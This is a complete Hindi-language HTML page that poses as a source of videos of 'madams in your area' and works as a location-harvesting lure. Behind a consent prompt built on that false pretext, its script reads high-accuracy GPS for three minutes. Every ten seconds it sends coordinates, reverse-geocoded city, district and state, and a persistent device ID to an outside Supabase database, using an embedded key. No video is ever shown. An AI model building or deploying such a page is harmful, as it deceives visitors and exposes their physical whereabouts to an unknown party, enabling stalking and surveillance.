
<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>मैडम की वीडियो</title>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  width: 100%;
  min-height: 100%;
  background: #ffffff;
  font-family: Arial, sans-serif;
}

body {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

#app {
  width: 100%;
  text-align: center;
  padding: 20px;
}

#locationButton {
  width: 112px;
  height: 112px;
  border: none;
  border-radius: 50%;
  background: #12c95a;
  padding: 0;
  cursor: pointer;
  animation: blink 1.2s infinite;
  -webkit-tap-highlight-color: transparent;
}

#locationButton:disabled {
  cursor: wait;
}

@keyframes blink {
  0% {
    opacity: 1;
    box-shadow: 0 0 0 0 rgba(18,201,90,.5);
  }
  70% {
    opacity: .75;
    box-shadow: 0 0 0 22px rgba(18,201,90,0);
  }
  100% {
    opacity: 1;
    box-shadow: 0 0 0 0 rgba(18,201,90,0);
  }
}

#result {
  display: none;
  margin-top: 24px;
  font-size: 20px;
  line-height: 1.8;
  color: #111111;
  overflow-wrap: anywhere;
}

#result div {
  margin: 4px 0;
}
</style>
</head>

<body>
<div id="app">

  <button id="locationButton"
          type="button"
          aria-label="अपने एरिया की मैडम की वीडियो के लिए लोकेशन साझा करें"></button>

  <div id="result" aria-live="polite">
    <div id="city"></div>
    <div id="state"></div>
  </div>

</div>

<script>
"use strict";

const SUPABASE_URL =
  "https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
  "sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";

const button = document.getElementById("locationButton");
const result = document.getElementById("result");
const cityElement = document.getElementById("city");
const stateElement = document.getElementById("state");

let busy = false;
let watchId = null;
let stopTimer = null;
let startedAt = 0;
let lastSaveAt = 0;
let lastCoordinates = null;
let locationDetails = {
  city: "",
  district: "",
  state: ""
};

const TRACKING_DURATION = 3 * 60 * 1000;
const SAVE_INTERVAL = 10000;

function getDeviceId() {
  let id = localStorage.getItem("location_demo_device_id");

  if (!id) {
    if (crypto.randomUUID) {
      id = crypto.randomUUID();
    } else {
      id = "device-" + Date.now() + "-" +
           Math.random().toString(36).slice(2);
    }

    localStorage.setItem("location_demo_device_id", id);
  }

  return id;
}

function showResult() {
  cityElement.textContent =
    "City: " + (locationDetails.city || "उपलब्ध नहीं");

  stateElement.textContent =
    "State: " + (locationDetails.state || "उपलब्ध नहीं");

  result.style.display = "block";
}

async function getAddress(lat, lon) {
  const url =
    "https://nominatim.openstreetmap.org/reverse" +
    "?format=jsonv2" +
    "&lat=" + encodeURIComponent(lat) +
    "&lon=" + encodeURIComponent(lon) +
    "&addressdetails=1" +
    "&accept-language=en";

  const response = await fetch(url);

  if (!response.ok) {
    throw new Error("Address lookup failed");
  }

  const geo = await response.json();
  const address = geo.address || {};

  const city =
    address.city ||
    address.town ||
    address.village ||
    address.municipality ||
    address.city_district ||
    address.suburb ||
    "";

  const district =
    address.state_district ||
    address.district ||
    address.county ||
    "";

  const state = address.state || "";

  return { city, district, state };
}

async function saveLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  const data = {
    device_id: getDeviceId(),
    latitude: lat,
    longitude: lon,
    accuracy: position.coords.accuracy,
    city: locationDetails.city || null,
    district: locationDetails.district || null,
    state: locationDetails.state || null
  };

  const response = await fetch(
    SUPABASE_URL + "/rest/v1/locations",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_KEY,
        "Authorization": "Bearer " + SUPABASE_KEY,
        "Prefer": "return=minimal"
      },
      body: JSON.stringify(data)
    }
  );

  if (!response.ok) {
    const message = await response.text();
    throw new Error(
      "Supabase save failed: " +
      response.status + " " + message
    );
  }

  lastSaveAt = Date.now();
}

async function processPosition(position, firstPosition) {
  if (!busy) return;

  lastCoordinates = position;

  // पहली लोकेशन पर City, District और State पता करें।
  if (firstPosition) {
    try {
      locationDetails = await getAddress(
        position.coords.latitude,
        position.coords.longitude
      );
    } catch (error) {
      console.warn("Address lookup failed:", error);
    }

    showResult();

    if (!busy) return;

    try {
      await saveLocation(position);
    } catch (error) {
      console.error("First location save failed:", error);
    }

    return;
  }

  // हर 10 सेकंड से पहले दोबारा सेव न करें।
  if (Date.now() - lastSaveAt < SAVE_INTERVAL) {
    return;
  }

  try {
    await saveLocation(position);
  } catch (error) {
    console.error("Location save failed:", error);
  }
}

function stopTracking() {
  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }

  if (stopTimer !== null) {
    clearTimeout(stopTimer);
    stopTimer = null;
  }

  busy = false;
}

function locationError(error) {
  console.warn("Location error:", error.message);

  stopTracking();

  button.disabled = false;
  button.style.display = "inline-block";

  cityElement.textContent =
    "City: लोकेशन प्राप्त नहीं हुई अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए";

  stateElement.textContent =
    "State: कृपया अनुमति और Location सेटिंग जाँचें";

  result.style.display = "block";
}

button.addEventListener("click", function () {
  if (busy) return;

  const consent = confirm("अपनी एरिया की मैडम की वीडियो पाने के लिए क्या आप सहमत हैं?");

  if (!consent) return;

  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है। अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए");
    return;
  }

  busy = true;
  startedAt = Date.now();
  lastSaveAt = 0;
  lastCoordinates = null;

  locationDetails = {
    city: "",
    district: "",
    state: ""
  };

  button.disabled = true;

  // तीन मिनट पूरे होने पर ट्रैकिंग बंद होगी।
  stopTimer = setTimeout(function () {
    stopTracking();
  }, TRACKING_DURATION);

  // पहली लोकेशन प्राप्त करें।
  navigator.geolocation.getCurrentPosition(
    function (position) {
      if (!busy) return;

      processPosition(position, true);

      // इसके बाद लोकेशन में बदलाव ट्रैक करें।
      if (busy) {
        watchId = navigator.geolocation.watchPosition(
          function (updatedPosition) {
            if (!busy) return;

            if (Date.now() - startedAt >= TRACKING_DURATION) {
              stopTracking();
              return;
            }

            processPosition(updatedPosition, false);
          },
          function (error) {
            console.warn("Location tracking error:", error.message);
          },
          {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
          }
        );
      }
    },
    locationError,
    {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    }
  );
});
</script>
</body>
</html>
